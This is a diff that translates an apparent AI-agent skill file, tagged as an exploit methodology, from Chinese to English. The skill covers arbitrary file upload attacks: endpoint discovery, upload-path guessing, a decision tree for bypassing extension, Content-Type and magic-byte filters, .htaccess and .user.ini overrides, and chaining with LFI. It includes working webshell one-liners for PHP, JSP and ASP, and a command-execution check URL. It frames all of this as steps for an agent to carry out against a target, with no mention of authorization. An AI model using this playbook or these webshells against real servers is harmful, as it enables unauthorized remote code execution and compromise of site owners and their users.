@@ -1,72 +1,77 @@
 ---
 name: file-upload-methodology
-description: "任意文件上传的检测、绕过和利用。当目标有上传功能(头像、附件、导入)、multipart表单、文件管理接口时使用。包含扩展名/Content-Type/Magic Bytes三层绕过、.htaccess覆盖、.user.ini+auto_prepend_file、图片马二次渲染绕过、ZIP解压利用、上传路径猜解方法"
+description: "Detection, bypass, and exploitation of arbitrary file upload. Use when the target has an upload feature (avatar, attachment, import), multipart forms, or a file management interface. Includes three-layer bypass (extension / Content-Type / magic bytes), .htaccess overwriting, .user.ini + auto_prepend_file, image shell secondary rendering bypass, ZIP extraction exploitation, and upload path guessing methods"
+zh-signals: "检测并绕过任意文件上传限制，实现 webshell 上传与利用。信号:文件上传,webshell,绕过,multipart,头像上传,rce"
+when-to-use: >-
+  Use when the target exposes an upload feature such as avatar, attachment, or import
+  endpoints, or a multipart form, and you need to bypass extension, Content-Type, or
+  magic-byte filters.
 metadata:
-  tags: "arbitrary_file_upload,file upload,webshell,bypass,path-traversal,rce,upload,multipart,Content-Type绕过,双扩展名,MIME,文件上传,avatar,头像,attachment,附件,import,导入,图片上传,image upload"
+  tags: "arbitrary_file_upload,file upload,webshell,bypass,path-traversal,rce,upload,multipart,Content-Type-bypass,double-extension,MIME,file-upload,avatar,avatar-upload,attachment,attachment-upload,import,import-file,image upload"
   category: "exploit"
 ---
 
-# 文件上传漏洞方法论
+# File Upload Vulnerability Methodology
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 需要扩展名/Content-Type/Magic Bytes 绕过详解、路径穿越、.htaccess 覆盖、.user.ini 利用、图片马二次渲染绕过、ZIP 解压利用 → [references/upload-bypass.md](references/upload-bypass.md)
+- Extension / Content-Type / magic byte bypass details, path traversal, .htaccess overwriting, .user.ini exploitation, image shell secondary rendering bypass, ZIP extraction exploitation → [references/upload-bypass.md](references/upload-bypass.md)
 
 ---
 
-## Phase 0: 上传功能发现与分析（最先执行！）
+## Phase 0: Upload Feature Discovery and Analysis (do this first!)
 
-1. 寻找 `<form enctype="multipart/form-data">` 或 `<input type="file">`
-2. 常见端点：`/upload`, `/api/upload`, `/avatar`, `/import`
-3. **关键收集**：允许的文件类型、上传后存储路径、服务器技术栈（PHP/Java/Python）
+1. Look for `<form enctype="multipart/form-data">` or `<input type="file">`
+2. Common endpoints: `/upload`, `/api/upload`, `/avatar`, `/import`
+3. **Key collection**: allowed file types, storage path after upload, server tech stack (PHP/Java/Python)
 
-**陷阱**：前端 JS 验证可以直接绕过，真正的限制在后端。
+**Trap**: client-side JavaScript validation can be bypassed directly; the real restriction is on the backend.
 
-## Phase 1: 基础上传测试
+## Phase 1: Basic Upload Test
 
-1. 先上传正常文件（.txt）确认功能正常，**记录返回的文件路径**
-2. 访问上传的文件 URL — 确认可访问
-3. 上传 .php 文件，观察是否被拒绝
+1. First upload a normal file (.txt) to confirm the function works, and **record the returned file path**
+2. Access the URL of the uploaded file — confirm it is reachable
+3. Upload a .php file and observe whether it is rejected
 
-**路径猜解**：`/uploads/`, `/upload/`, `/files/`, `/static/uploads/`, `/images/`
+**Path guessing**: `/uploads/`, `/upload/`, `/files/`, `/static/uploads/`, `/images/`
 
-## Phase 2: 绕过决策树
+## Phase 2: Bypass Decision Tree
 
 ```
-上传被拒绝？
-├─ 扩展名限制（黑名单）→ .phtml/.php5/大小写/.php./双写 → [references/upload-bypass.md](references/upload-bypass.md)
-├─ 扩展名限制（白名单）→ .htaccess 覆盖（Apache）或 .user.ini（通用）→ [references/upload-bypass.md](references/upload-bypass.md)
-├─ Content-Type 限制 → 改为 image/jpeg
-├─ 文件头检查 → GIF89a + webshell
-├─ 二次渲染检查 → 图片马（GIF 优先）→ [references/upload-bypass.md](references/upload-bypass.md)
-└─ 三层都限制 → 组合绕过：扩展名 + Content-Type + 文件头
+Upload rejected?
+├─ Extension restriction (blacklist) → .phtml/.php5/case variation/.php./double extension → [references/upload-bypass.md](references/upload-bypass.md)
+├─ Extension restriction (whitelist) → .htaccess overwriting (Apache) or .user.ini (universal) → [references/upload-bypass.md](references/upload-bypass.md)
+├─ Content-Type restriction → change to image/jpeg
+├─ File header check → GIF89a + webshell
+├─ Secondary rendering check → image shell (GIF preferred) → [references/upload-bypass.md](references/upload-bypass.md)
+└─ All three layers restricted → combined bypass: extension + Content-Type + file header
 ```
 
 ## Phase 3: Webshell Payload
 
-**PHP**（最常见）：
+**PHP** (most common):
 ```php
 <?php system($_GET['cmd']); ?>
 ```
-精简版（绕过关键字）：`<?=`$_GET[1]`?>`
+Slim version (bypasses keyword filters): `<?=`$_GET[1]`?>`
 
 **JSP**: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
 **ASP**: `<%eval request("cmd")%>`
 
-### 上传后验证
+### Post-Upload Verification
 ```
 http://target/uploads/shell.php?cmd=id
 ```
-**陷阱**：访问 .php 返回源代码 → 该目录禁止执行，需要路径穿越或 .htaccess。
+**Trap**: accessing the .php returns the source code → that directory forbids execution, so you need path traversal or .htaccess.
 
-## 注意事项
-- **上传成功 ≠ 可利用**：必须访问验证执行
-- **服务端可能 hash 重命名**：从响应中获取新文件名
-- **记录每次尝试的扩展名和响应**：快速排除无效绕过
+## Notes
+- **Upload success ≠ exploitable**: you must access the file to verify execution
+- **The server may hash and rename files**: get the new filename from the response
+- **Record the extension and response for every attempt**: quickly rule out ineffective bypasses
 
-## .htaccess 攻击
-- 两步法：先上传 .htaccess 配置 PHP 解析规则，再上传 shell.jpg
+## .htaccess Attack
+- Two-step method: first upload a .htaccess that configures PHP parsing rules, then upload shell.jpg
 
-## 上传≠执行
-- 上传成功不代表能利用（上传≠执行），需要确认文件可被访问和解析
-- 配合文件包含（LFI）等其他漏洞执行上传的 webshell
+## Upload ≠ Execution
+- A successful upload does not mean it is exploitable (upload ≠ execution); you must confirm the file can be accessed and parsed
+- Combine with file inclusion (LFI) and other vulnerabilities to execute the uploaded webshell
